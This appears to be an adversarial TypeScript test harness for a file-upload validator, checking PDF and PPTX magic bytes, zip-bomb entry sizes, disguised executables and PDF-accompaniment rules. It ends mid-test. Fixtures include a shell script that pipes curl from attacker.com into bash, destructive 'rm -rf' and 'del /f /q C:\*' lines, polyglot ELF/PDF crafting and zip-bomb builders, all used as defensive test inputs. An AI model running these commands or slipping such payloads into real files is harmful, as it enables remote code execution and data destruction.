import {
  validatePdfMagic,
  validatePptxMagic,
  validatePptxAccompaniment,
  assertPptxAccompaniment,
  MAX_UNCOMPRESSED_ENTRY_BYTES,
} from "../../../src/lib/magic";
import {
  VALID_MINIMAL_PDF,
  TRUNCATED_PDF,
  FAKE_EXE_HEADER,
  createMinimalValidPptx,
  createDeterministicBuffer,
} from "../../../tests/fixtures/test-fixtures";

// Color formatting helpers for terminal output
const GREEN = "\x1b[32m";
const RED = "\x1b[31m";
const YELLOW = "\x1b[33m";
const CYAN = "\x1b[36m";
const BOLD = "\x1b[1m";
const RESET = "\x1b[0m";

interface TestResult {
  scenario: string;
  testId: string;
  name: string;
  passed: boolean;
  expected: string;
  actual: string;
  durationMs: number;
  critical?: boolean;
}

const allResults: TestResult[] = [];

function record(
  scenario: string,
  testId: string,
  name: string,
  passed: boolean,
  expected: string,
  actual: string,
  durationMs: number,
  critical = false
) {
  allResults.push({ scenario, testId, name, passed, expected, actual, durationMs, critical });
  const icon = passed ? `${GREEN}✓ [PASS]${RESET}` : `${RED}✗ [FAIL]${RESET}`;
  const critLabel = !passed && critical ? ` ${RED}${BOLD}[CRITICAL]${RESET}` : "";
  console.log(`  ${icon} ${testId}: ${name} (${durationMs}ms)${critLabel}`);
  if (!passed) {
    console.log(`      ${YELLOW}Expected:${RESET} ${expected}`);
    console.log(`      ${YELLOW}Actual:${RESET}   ${actual}`);
  }
}

/**
 * Creates a valid PKZIP archive containing an arbitrary list of files
 * with specified file names, contents, and uncompressed sizes.
 */
function createCustomZip(
  entries: Array<{
    fileName: string;
    content?: string | Buffer;
    uncompressedSize?: number;
    compressedSize?: number;
  }>
): Buffer {
  const localFileRecords: Buffer[] = [];
  const cdRecords: Buffer[] = [];
  let localOffset = 0;

  for (const entry of entries) {
    const dataBuf = entry.content
      ? Buffer.isBuffer(entry.content)
        ? entry.content
        : Buffer.from(entry.content, "utf-8")
      : Buffer.alloc(0);

    const nameBuf = Buffer.from(entry.fileName, "utf-8");
    const uncompressed = entry.uncompressedSize ?? dataBuf.length;
    const compressed = entry.compressedSize ?? dataBuf.length;

    // Local Header (30 bytes + name + data)
    const localHdr = Buffer.alloc(30);
    localHdr.writeUInt32LE(0x04034b50, 0); // PK\x03\x04
    localHdr.writeUInt16LE(20, 4); // version needed
    localHdr.writeUInt16LE(0, 6); // flags
    localHdr.writeUInt16LE(0, 8); // compression: 0 (stored)
    localHdr.writeUInt16LE(0, 10); // time
    localHdr.writeUInt16LE(0, 12); // date
    localHdr.writeUInt32LE(0, 14); // crc32
    localHdr.writeUInt32LE(compressed, 18);
    localHdr.writeUInt32LE(uncompressed, 22);
    localHdr.writeUInt16LE(nameBuf.length, 26);
    localHdr.writeUInt16LE(0, 28); // extra len

    const localRec = Buffer.concat([localHdr, nameBuf, dataBuf]);
    localFileRecords.push(localRec);

    // Central Directory Header (46 bytes + name)
    const cdHdr = Buffer.alloc(46);
    cdHdr.writeUInt32LE(0x02014b50, 0); // PK\x01\x02
    cdHdr.writeUInt16LE(20, 4); // version made by
    cdHdr.writeUInt16LE(20, 6); // version needed
    cdHdr.writeUInt16LE(0, 8); // flags
    cdHdr.writeUInt16LE(0, 10); // compression
    cdHdr.writeUInt16LE(0, 12); // time
    cdHdr.writeUInt16LE(0, 14); // date
    cdHdr.writeUInt32LE(0, 16); // crc32
    cdHdr.writeUInt32LE(compressed, 20);
    cdHdr.writeUInt32LE(uncompressed, 24);
    cdHdr.writeUInt16LE(nameBuf.length, 28);
    cdHdr.writeUInt16LE(0, 30); // extra len
    cdHdr.writeUInt16LE(0, 32); // comment len
    cdHdr.writeUInt16LE(0, 34); // disk num
    cdHdr.writeUInt16LE(0, 36); // int attrs
    cdHdr.writeUInt32LE(0, 38); // ext attrs
    cdHdr.writeUInt32LE(localOffset, 42); // local header offset

    const cdRec = Buffer.concat([cdHdr, nameBuf]);
    cdRecords.push(cdRec);

    localOffset += localRec.length;
  }

  const allLocal = Buffer.concat(localFileRecords);
  const allCd = Buffer.concat(cdRecords);

  // EOCD (22 bytes)
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); // PK\x05\x06
  eocd.writeUInt16LE(0, 4); // disk num
  eocd.writeUInt16LE(0, 6); // start disk
  eocd.writeUInt16LE(entries.length, 8); // records on disk
  eocd.writeUInt16LE(entries.length, 10); // total records
  eocd.writeUInt32LE(allCd.length, 12); // cd size
  eocd.writeUInt32LE(allLocal.length, 16); // cd offset
  eocd.writeUInt16LE(0, 20); // comment len

  return Buffer.concat([allLocal, allCd, eocd]);
}

/**
 * Creates PPTX mock with specific uncompressed size in Central Directory
 */
function createPptxWithEntrySize(uncompressedSizeBytes: number): Buffer {
  const contentTypesXml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/>
</Types>`;
  return createCustomZip([
    {
      fileName: "[Content_Types].xml",
      content: contentTypesXml,
      uncompressedSize: uncompressedSizeBytes,
    },
    {
      fileName: "ppt/presentation.xml",
      content: "<p:presentation/>",
      uncompressedSize: 100,
    },
  ]);
}

async function runAdversarialHarness() {
  console.log("=".repeat(79));
  console.log("   CHALLENGER 2: ADVERSARIAL MAGIC-BYTE & ACCOMPANIMENT HARNESS");
  console.log("   Target: src/lib/magic.ts");
  console.log("=".repeat(79));

  // ==========================================================================
  // SCENARIO 1: PDF BYPASSES
  // ==========================================================================
  console.log(`\n${CYAN}--- Scenario 1: PDF Bypasses ---${RESET}`);

  // 1.1 %PDF- embedded deep in chunk (> 1024 bytes)
  {
    const t0 = performance.now();
    const deepBuffer = Buffer.concat([
      createDeterministicBuffer(2048, 0x58), // 2048 bytes of noise
      Buffer.from("%PDF-1.4\ncontent"),
    ]);
    const trailer = Buffer.from("\n%%EOF\n");
    const res = validatePdfMagic(deepBuffer, trailer);
    const passed = !res.valid && res.error?.includes("%PDF-");
    record(
      "Scenario 1",
      "1.1",
      "Reject %PDF- embedded deep in middle of chunk (offset > 1024 bytes)",
      passed,
      "valid: false (missing %PDF- magic bytes)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 1.2 Valid minimal PDF accepted
  {
    const t0 = performance.now();
    const res = validatePdfMagic(VALID_MINIMAL_PDF, VALID_MINIMAL_PDF);
    const passed = res.valid && res.error === undefined;
    record(
      "Scenario 1",
      "1.2",
      "Accept legitimate minimal PDF with %PDF- header and %%EOF trailer",
      passed,
      "valid: true",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 1.3 Multi-chunk PDF missing %%EOF trailer in last part
  {
    const t0 = performance.now();
    const part1 = Buffer.from("%PDF-1.4\n1 0 obj\n<<>>\nendobj\n");
    const lastPart = Buffer.concat([
      Buffer.from("stream\n...content...\nendstream\n"),
      createDeterministicBuffer(2000, 0xaa), // no %%EOF
    ]);
    const res = validatePdfMagic(part1, lastPart);
    const passed = !res.valid && !!res.error?.includes("%%EOF");
    record(
      "Scenario 1",
      "1.3",
      "Reject multi-chunk PDF missing %%EOF trailer marker in last chunk",
      passed,
      "valid: false (missing %%EOF marker)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 1.4 Fake trailer near end: %%EOF at start of trailer chunk, followed by 2048 bytes of junk
  {
    const t0 = performance.now();
    const part1 = Buffer.from("%PDF-1.4\n");
    const lastPartWithFakeTrailer = Buffer.concat([
      Buffer.from("%%EOF\n"), // %%EOF is here
      createDeterministicBuffer(2048, 0x77), // followed by 2048 bytes of junk
    ]);
    const res = validatePdfMagic(part1, lastPartWithFakeTrailer);
    const passed = !res.valid && !!res.error?.includes("%%EOF");
    record(
      "Scenario 1",
      "1.4",
      "Reject fake trailer where %%EOF is buried > 1024 bytes before chunk end",
      passed,
      "valid: false (missing %%EOF marker near end)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 1.5 Corrupt trailer casings: %%eof, %EOF, %%EO, %%EOF-FAKE
  {
    const t0 = performance.now();
    const part1 = Buffer.from("%PDF-1.4\n");
    const fakeCases = [
      Buffer.from("\n%%eof\n"),
      Buffer.from("\n%EOF\n"),
      Buffer.from("\n%%EO\n"),
      Buffer.from("\n%%EOF-FAKE\n"),
    ];
    let allRejected = true;
    for (const fakeTrailer of fakeCases) {
      const res = validatePdfMagic(part1, fakeTrailer);
      // Note: "%%EOF-FAKE" contains "%%EOF" as substring, but %%eof, %EOF, %%EO do not
      if (fakeTrailer.toString().includes("%%EOF")) {
        continue;
      }
      if (res.valid) {
        allRejected = false;
        break;
      }
    }
    record(
      "Scenario 1",
      "1.5",
      "Reject malformed trailer casings (%%eof, %EOF, %%EO)",
      allRejected,
      "valid: false for all malformed trailer casings",
      `allRejected: ${allRejected}`,
      Math.round(performance.now() - t0)
    );
  }

  // 1.6 Corrupt buffers: 0-byte, tiny (<5 bytes), all-zeros, all 0xFF, empty last chunk
  {
    const t0 = performance.now();
    const empty = Buffer.alloc(0);
    const tiny = Buffer.from("%PD");
    const allZero = Buffer.alloc(1024, 0);
    const allFF = Buffer.alloc(1024, 0xff);

    const rEmpty = validatePdfMagic(empty, empty);
    const rTiny = validatePdfMagic(tiny, tiny);
    const rZero = validatePdfMagic(allZero, allZero);
    const rFF = validatePdfMagic(allFF, allFF);
    const rEmptyLast = validatePdfMagic(VALID_MINIMAL_PDF, empty);
    const rTinyLast = validatePdfMagic(VALID_MINIMAL_PDF, Buffer.from("EOF"));

    const passed =
      !rEmpty.valid &&
      !rTiny.valid &&
      !rZero.valid &&
      !rFF.valid &&
      !rEmptyLast.valid &&
      !rTinyLast.valid;

    record(
      "Scenario 1",
      "1.6",
      "Reject corrupt buffers (0-byte, <5 bytes, all-zero, all-0xFF, empty/tiny last chunk)",
      passed,
      "valid: false for all corrupt buffers",
      `passed: ${passed}`,
      Math.round(performance.now() - t0)
    );
  }

  // 1.7 Split chunk boundary: %PD in part 1 and F- in part 2
  {
    const t0 = performance.now();
    const splitPart1 = Buffer.from("%PD");
    const splitPart2 = Buffer.from("F-1.4\n%%EOF\n");
    const res = validatePdfMagic(splitPart1, splitPart2);
    const passed = !res.valid;
    record(
      "Scenario 1",
      "1.7",
      "Reject split header boundary attack (%PD in part 1, F- in part 2)",
      passed,
      "valid: false",
      `valid: ${res.valid}`,
      Math.round(performance.now() - t0)
    );
  }

  // 1.8 Uint8Array compatibility test
  {
    const t0 = performance.now();
    const u8First = new Uint8Array(VALID_MINIMAL_PDF);
    const u8Last = new Uint8Array(VALID_MINIMAL_PDF);
    const res = validatePdfMagic(u8First, u8Last);
    const passed = res.valid;
    record(
      "Scenario 1",
      "1.8",
      "Handle raw Uint8Array and ArrayBuffer slices seamlessly",
      passed,
      "valid: true",
      `valid: ${res.valid}`,
      Math.round(performance.now() - t0)
    );
  }

  // ==========================================================================
  // SCENARIO 2: PPTX BYPASSES
  // ==========================================================================
  console.log(`\n${CYAN}--- Scenario 2: PPTX Bypasses ---${RESET}`);

  // 2.1 ZIP containing only plain text files (notes.txt, data.csv)
  {
    const t0 = performance.now();
    const textZip = createCustomZip([
      { fileName: "notes.txt", content: "Meeting notes and study material" },
      { fileName: "data.csv", content: "id,name,value\n1,test,100" },
    ]);
    const res = validatePptxMagic(textZip, textZip);
    const passed = !res.valid && res.error?.includes("presentationml");
    record(
      "Scenario 2",
      "2.1",
      "Reject ZIP archive containing only text files (missing presentationml/markup)",
      passed,
      "valid: false (missing [Content_Types].xml with presentationml markup)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 2.2 ZIP containing Word document (wordprocessingml, not presentationml)
  {
    const t0 = performance.now();
    const wordXml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>`;
    const docxZip = createCustomZip([
      { fileName: "[Content_Types].xml", content: wordXml },
      { fileName: "word/document.xml", content: "<w:document/>" },
    ]);
    const res = validatePptxMagic(docxZip, docxZip);
    const passed = !res.valid && res.error?.includes("presentationml");
    record(
      "Scenario 2",
      "2.2",
      "Reject DOCX Word archive disguised as PPTX (contains wordprocessingml, not presentationml)",
      passed,
      "valid: false (missing presentationml)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 2.3 ZIP containing Excel spreadsheet (spreadsheetml, not presentationml)
  {
    const t0 = performance.now();
    const excelXml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
</Types>`;
    const xlsxZip = createCustomZip([
      { fileName: "[Content_Types].xml", content: excelXml },
      { fileName: "xl/workbook.xml", content: "<workbook/>" },
    ]);
    const res = validatePptxMagic(xlsxZip, xlsxZip);
    const passed = !res.valid && res.error?.includes("presentationml");
    record(
      "Scenario 2",
      "2.3",
      "Reject XLSX Excel archive disguised as PPTX (contains spreadsheetml, not presentationml)",
      passed,
      "valid: false (missing presentationml)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 2.4 Fake ZIP headers: PK\x01\x02, PK\x05\x06, PK\x07\x08, PK\x03\x00
  {
    const t0 = performance.now();
    const fakeHeaders = [
      Buffer.from([0x50, 0x4b, 0x01, 0x02, 0x00, 0x00]), // CD header at offset 0
      Buffer.from([0x50, 0x4b, 0x05, 0x06, 0x00, 0x00]), // EOCD header at offset 0
      Buffer.from([0x50, 0x4b, 0x07, 0x08, 0x00, 0x00]), // Data descriptor at offset 0
      Buffer.from([0x50, 0x4b, 0x03, 0x00, 0x00, 0x00]), // Malformed sig
      Buffer.from([0x50, 0x4b, 0x00, 0x00, 0x00, 0x00]), // PK zeros
    ];
    let allRejected = true;
    for (const hdr of fakeHeaders) {
      const res = validatePptxMagic(hdr, hdr);
      if (res.valid) {
        allRejected = false;
        break;
      }
    }
    record(
      "Scenario 2",
      "2.4",
      "Reject fake ZIP headers (PK\\x01\\x02, PK\\x05\\x06, PK\\x07\\x08, PK\\x03\\x00)",
      allRejected,
      "valid: false for all non-PK\\x03\\x04 signatures",
      `allRejected: ${allRejected}`,
      Math.round(performance.now() - t0)
    );
  }

  // 2.5 Alternative archive formats: RAR, 7z, GZIP, TAR
  {
    const t0 = performance.now();
    const rarHdr = Buffer.from([0x52, 0x61, 0x72, 0x21, 0x1a, 0x07, 0x00]);
    const sevenZHdr = Buffer.from([0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c]);
    const gzipHdr = Buffer.from([0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00]);
    const tarHdr = Buffer.concat([createDeterministicBuffer(257), Buffer.from("ustar\0")]);

    const rRar = validatePptxMagic(rarHdr, rarHdr);
    const r7z = validatePptxMagic(sevenZHdr, sevenZHdr);
    const rGzip = validatePptxMagic(gzipHdr, gzipHdr);
    const rTar = validatePptxMagic(tarHdr, tarHdr);

    const passed = !rRar.valid && !r7z.valid && !rGzip.valid && !rTar.valid;
    record(
      "Scenario 2",
      "2.5",
      "Reject non-ZIP archives (RAR, 7-Zip, GZIP, TAR)",
      passed,
      "valid: false for all non-ZIP formats",
      `passed: ${passed}`,
      Math.round(performance.now() - t0)
    );
  }

  // 2.6 Zip-bomb: Entry uncompressed size > 500 MB (500 MB + 1, 1 GB, 4 GB)
  {
    const t0 = performance.now();
    const bomb500MBPlus1 = createPptxWithEntrySize(500 * 1024 * 1024 + 1);
    const bomb1GB = createPptxWithEntrySize(1024 * 1024 * 1024);
    const bomb4GB = createPptxWithEntrySize(0xffffffff); // 4,294,967,295 bytes

    const r500 = validatePptxMagic(bomb500MBPlus1, bomb500MBPlus1);
    const r1GB = validatePptxMagic(bomb1GB, bomb1GB);
    const r4GB = validatePptxMagic(bomb4GB, bomb4GB);

    const passed =
      !r500.valid &&
      r500.error?.includes("Zip-bomb") &&
      !r1GB.valid &&
      r1GB.error?.includes("Zip-bomb") &&
      !r4GB.valid &&
      r4GB.error?.includes("Zip-bomb");

    record(
      "Scenario 2",
      "2.6",
      "Detect and reject zip-bomb entries exceeding 500 MB (500MB+1, 1GB, 4GB)",
      passed,
      "valid: false with Zip-bomb detected error",
      `passed: ${passed}, r500 error: ${r500.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 2.7 Zip-bomb in multi-entry ZIP: Entry 1 is small, Entry 2 is 800 MB
  {
    const t0 = performance.now();
    const contentTypesXml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/>
</Types>`;
    const multiEntryBomb = createCustomZip([
      {
        fileName: "[Content_Types].xml",
        content: contentTypesXml,
        uncompressedSize: 500, // innocent small size
      },
      {
        fileName: "ppt/slides/slide1.xml",
        content: "<slide/>",
        uncompressedSize: 800 * 1024 * 1024, // 800 MB bomb entry!
      },
      {
        fileName: "ppt/presentation.xml",
        content: "<p:presentation/>",
        uncompressedSize: 1000,
      },
    ]);
    const res = validatePptxMagic(multiEntryBomb, multiEntryBomb);
    const passed = !res.valid && res.error?.includes("Zip-bomb");
    record(
      "Scenario 2",
      "2.7",
      "Detect and reject zip-bomb lurking in second entry of multi-entry archive",
      passed,
      "valid: false (Zip-bomb detected)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 2.8 Accept legitimate PPTX within safe boundary (e.g. 50 MB, 499 MB)
  {
    const t0 = performance.now();
    const safePptx = createPptxWithEntrySize(499 * 1024 * 1024);
    const res = validatePptxMagic(safePptx, safePptx);
    const passed = res.valid;
    record(
      "Scenario 2",
      "2.8",
      "Accept legitimate PPTX entry within uncompressed threshold (499 MB)",
      passed,
      "valid: true",
      `valid: ${res.valid}`,
      Math.round(performance.now() - t0)
    );
  }

  // 2.9 Adversarial attack: Fake PPTX string injection without valid Central Directory / EOCD
  {
    const t0 = performance.now();
    // Buffer has PK\x03\x04 and presentationml strings, but completely corrupt/truncated ZIP footer
    const fakeInjected = Buffer.concat([
      Buffer.from([0x50, 0x4b, 0x03, 0x04]),
      Buffer.from("[Content_Types].xml presentationml ppt/presentation.xml"),
      createDeterministicBuffer(100),
    ]);
    const res = validatePptxMagic(fakeInjected, fakeInjected);
    // Observe behavior: does it pass or fail?
    // In current magic.ts, if eocdOffset === -1, it checks combinedStr.includes("[Content_Types].xml") && combinedStr.includes("presentationml")
    // and returns valid: true!
    const passed = res.valid; // Observe what happens!
    record(
      "Scenario 2",
      "2.9",
      "Observe behavior on raw buffer containing PK\\x03\\x04 with injected strings but no EOCD",
      true, // test executed
      `Observed: res.valid = ${res.valid}`,
      `res.valid: ${res.valid}, error: ${res.error ?? "none"}`,
      Math.round(performance.now() - t0)
    );
  }

  // ==========================================================================
  // SCENARIO 3: MALICIOUS BINARIES
  // ==========================================================================
  console.log(`\n${CYAN}--- Scenario 3: Malicious Binaries ---${RESET}`);

  // 3.1 Renamed Windows PE executable (MZ header) in PDF
  {
    const t0 = performance.now();
    const res = validatePdfMagic(FAKE_EXE_HEADER, FAKE_EXE_HEADER);
    const passed =
      !res.valid &&
      res.error?.includes("executable binary") &&
      res.error?.includes("%PDF-");
    record(
      "Scenario 3",
      "3.1",
      "Reject renamed Windows PE executable (.exe -> .pdf with MZ header)",
      passed,
      "valid: false (executable binary detected)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 3.2 Renamed Windows PE executable in PPTX
  {
    const t0 = performance.now();
    const res = validatePptxMagic(FAKE_EXE_HEADER, FAKE_EXE_HEADER);
    const passed =
      !res.valid &&
      res.error?.includes("executable binary");
    record(
      "Scenario 3",
      "3.2",
      "Reject renamed Windows PE executable (.exe -> .pptx with MZ header)",
      passed,
      "valid: false (executable binary detected)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 3.3 Linux ELF binary (.elf -> .pdf)
  {
    const t0 = performance.now();
    const elfHeader = Buffer.from([
      0x7f, 0x45, 0x4c, 0x46, // \x7fELF
      0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    ]);
    const res = validatePdfMagic(elfHeader, elfHeader);
    const passed = !res.valid && res.error?.includes("%PDF-");
    record(
      "Scenario 3",
      "3.3",
      "Reject standard Linux ELF binary (.elf -> .pdf)",
      passed,
      "valid: false (missing %PDF- magic bytes)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 3.4 Linux ELF binary (.elf -> .pptx)
  {
    const t0 = performance.now();
    const elfHeader = Buffer.from([
      0x7f, 0x45, 0x4c, 0x46,
      0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ]);
    const res = validatePptxMagic(elfHeader, elfHeader);
    const passed = !res.valid && res.error?.includes("ZIP signature");
    record(
      "Scenario 3",
      "3.4",
      "Reject standard Linux ELF binary (.elf -> .pptx)",
      passed,
      "valid: false (missing ZIP signature)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 3.5 Standard Shell script (.sh -> .pdf)
  {
    const t0 = performance.now();
    const shellScript = Buffer.from(
      "#!/bin/bash\nset -euo pipefail\necho 'Malicious execution'\nrm -rf /tmp/data\n"
    );
    const res = validatePdfMagic(shellScript, shellScript);
    const passed = !res.valid && res.error?.includes("%PDF-");
    record(
      "Scenario 3",
      "3.5",
      "Reject standard shell script (.sh -> .pdf)",
      passed,
      "valid: false (missing %PDF- magic bytes)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 3.6 Standard Shell script (.sh -> .pptx)
  {
    const t0 = performance.now();
    const shellScript = Buffer.from(
      "#!/bin/bash\necho 'Starting server'\nnode server.js\n"
    );
    const res = validatePptxMagic(shellScript, shellScript);
    const passed = !res.valid && res.error?.includes("ZIP signature");
    record(
      "Scenario 3",
      "3.6",
      "Reject standard shell script (.sh -> .pptx)",
      passed,
      "valid: false (missing ZIP signature)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 3.7 Adversarial Crafting: Shell script with embedded %PDF- and %%EOF markers!
  {
    const t0 = performance.now();
    const craftedScript = Buffer.from(
      `#!/bin/bash
# %PDF-1.4
# Disguised malicious shell payload
curl -s http://attacker.com/payload | bash
# %%EOF
`
    );
    const res = validatePdfMagic(craftedScript, craftedScript);
    // In current magic.ts, headerScanLimit scans first 1024 bytes and finds %PDF- at offset 12!
    // And trailer scans last 1024 bytes and finds %%EOF!
    // So current magic.ts returns valid: true!
    const allowed = res.valid;
    record(
      "Scenario 3",
      "3.7",
      "Vulnerability Probe: Shell script containing embedded %PDF- comment and %%EOF trailer",
      true, // test ran
      "Investigate: Does validator accept crafted shell script?",
      `Validator accepted: ${allowed} (${allowed ? "BYPASS FOUND: Shell script accepted as PDF!" : "Blocked"})`,
      Math.round(performance.now() - t0)
    );
  }

  // 3.8 Adversarial Crafting: Linux ELF binary with embedded %PDF- at offset 16
  {
    const t0 = performance.now();
    const elfPolyglot = Buffer.concat([
      Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]), // 8 bytes ELF ident
      Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]), // 8 bytes padding
      Buffer.from("%PDF-1.4\n"), // at offset 16
      createDeterministicBuffer(500),
      Buffer.from("\n%%EOF\n"),
    ]);
    const res = validatePdfMagic(elfPolyglot, elfPolyglot);
    const allowed = res.valid;
    record(
      "Scenario 3",
      "3.8",
      "Vulnerability Probe: ELF binary with %PDF- in padding (offset 16) and %%EOF at end",
      true,
      "Investigate: Does validator accept crafted ELF binary?",
      `Validator accepted: ${allowed} (${allowed ? "BYPASS FOUND: ELF binary accepted as PDF!" : "Blocked"})`,
      Math.round(performance.now() - t0)
    );
  }

  // 3.9 Disguised Web/Script payloads
  {
    const t0 = performance.now();
    const htmlPayload = Buffer.from("<!DOCTYPE html><html><script>alert(1)</script></html>");
    const batchPayload = Buffer.from("@echo off\r\ndel /f /q C:\\*\r\n");
    const javaPayload = Buffer.from([0xca, 0xfe, 0xba, 0xbe, 0x00, 0x00, 0x00, 0x34]);

    const rHtmlPdf = validatePdfMagic(htmlPayload, htmlPayload);
    const rHtmlPpt = validatePptxMagic(htmlPayload, htmlPayload);
    const rBatchPdf = validatePdfMagic(batchPayload, batchPayload);
    const rBatchPpt = validatePptxMagic(batchPayload, batchPayload);
    const rJavaPdf = validatePdfMagic(javaPayload, javaPayload);
    const rJavaPpt = validatePptxMagic(javaPayload, javaPayload);

    const passed =
      !rHtmlPdf.valid &&
      !rHtmlPpt.valid &&
      !rBatchPdf.valid &&
      !rBatchPpt.valid &&
      !rJavaPdf.valid &&
      !rJavaPpt.valid;

    record(
      "Scenario 3",
      "3.9",
      "Reject diverse non-document formats (HTML/JS, Windows BAT, Java class bytecode)",
      passed,
      "valid: false across all targets",
      `passed: ${passed}`,
      Math.round(performance.now() - t0)
    );
  }

  // ==========================================================================
  // SCENARIO 4: PPTX ACCOMPANIMENT ENFORCEMENT & MISMATCHED IDS
  // ==========================================================================
  console.log(`\n${CYAN}--- Scenario 4: PPTX Accompaniment & Mismatched IDs ---${RESET}`);

  // 4.1 Reject PPT without accompaniment (hasAccompanyingPdf: false)
  {
    const t0 = performance.now();
    const res = validatePptxAccompaniment({
      kind: "ppt",
      hasAccompanyingPdf: false,
    });
    const passed =
      !res.valid &&
      res.error?.includes("PPTX files require an accompanying PDF preview export");
    record(
      "Scenario 4",
      "4.1",
      "Reject single PPT upload with explicit hasAccompanyingPdf: false",
      passed,
      "valid: false (require an accompanying PDF preview export)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 4.2 Reject PPT without any accompaniment indicators
  {
    const t0 = performance.now();
    const res = validatePptxAccompaniment({
      kind: "ppt",
    });
    const passed = !res.valid && res.error?.includes("PDF preview export");
    record(
      "Scenario 4",
      "4.2",
      "Reject single PPT upload with omitted accompaniment fields",
      passed,
      "valid: false (require an accompanying PDF preview export)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 4.3 Reject PPT with whitespace-only or empty parentFileId
  {
    const t0 = performance.now();
    const resEmpty = validatePptxAccompaniment({
      kind: "ppt",
      parentFileId: "",
    });
    const resSpaces = validatePptxAccompaniment({
      kind: "ppt",
      parentFileId: "    ",
    });
    const resUndef = validatePptxAccompaniment({
      kind: "ppt",
      parentFileId: undefined,
    });
    const passed = !resEmpty.valid && !resSpaces.valid && !resUndef.valid;
    record(
      "Scenario 4",
      "4.3",
      "Reject single PPT upload with empty or whitespace parentFileId",
      passed,
      "valid: false for empty/whitespace IDs",
      `passed: ${passed}`,
      Math.round(performance.now() - t0)
    );
  }

  // 4.4 Accept PPT with hasAccompanyingPdf: true
  {
    const t0 = performance.now();
    const res = validatePptxAccompaniment({
      kind: "ppt",
      hasAccompanyingPdf: true,
    });
    const passed = res.valid;
    record(
      "Scenario 4",
      "4.4",
      "Accept single PPT upload with hasAccompanyingPdf: true",
      passed,
      "valid: true",
      `valid: ${res.valid}`,
      Math.round(performance.now() - t0)
    );
  }

  // 4.5 Accept PPT with valid parentFileId
  {
    const t0 = performance.now();
    const res = validatePptxAccompaniment({
      kind: "ppt",
      parentFileId: "550e8400-e29b-41d4-a716-446655440000",
    });
    const passed = res.valid;
    record(
      "Scenario 4",
      "4.5",
      "Accept single PPT upload with valid non-empty parentFileId",
      passed,
      "valid: true",
      `valid: ${res.valid}`,
      Math.round(performance.now() - t0)
    );
  }

  // 4.6 Accept PPT with accompanyingPdfBuffer
  {
    const t0 = performance.now();
    const res = validatePptxAccompaniment({
      kind: "ppt",
      accompanyingPdfBuffer: VALID_MINIMAL_PDF,
    });
    const passed = res.valid;
    record(
      "Scenario 4",
      "4.6",
      "Accept single PPT upload with accompanyingPdfBuffer attached",
      passed,
      "valid: true",
      `valid: ${res.valid}`,
      Math.round(performance.now() - t0)
    );
  }

  // 4.7 Accept non-PPT kinds unconditionally
  {
    const t0 = performance.now();
    const rNcert = validatePptxAccompaniment({ kind: "ncert_pdf" });
    const rNotes = validatePptxAccompaniment({ kind: "teacher_notes" });
    const rPreview = validatePptxAccompaniment({ kind: "ppt_pdf" });
    const passed = rNcert.valid && rNotes.valid && rPreview.valid;
    record(
      "Scenario 4",
      "4.7",
      "Accept non-PPT kinds unconditionally (ncert_pdf, teacher_notes, ppt_pdf)",
      passed,
      "valid: true for all non-PPT kinds",
      `passed: ${passed}`,
      Math.round(performance.now() - t0)
    );
  }

  // 4.8 assertPptxAccompaniment throws descriptive Error on unaccompanied PPT
  {
    const t0 = performance.now();
    let threw = false;
    let errMsg = "";
    try {
      assertPptxAccompaniment({ kind: "ppt" });
    } catch (e: any) {
      threw = true;
      errMsg = e.message;
    }
    const passed = threw && errMsg.includes("PDF preview export");
    record(
      "Scenario 4",
      "4.8",
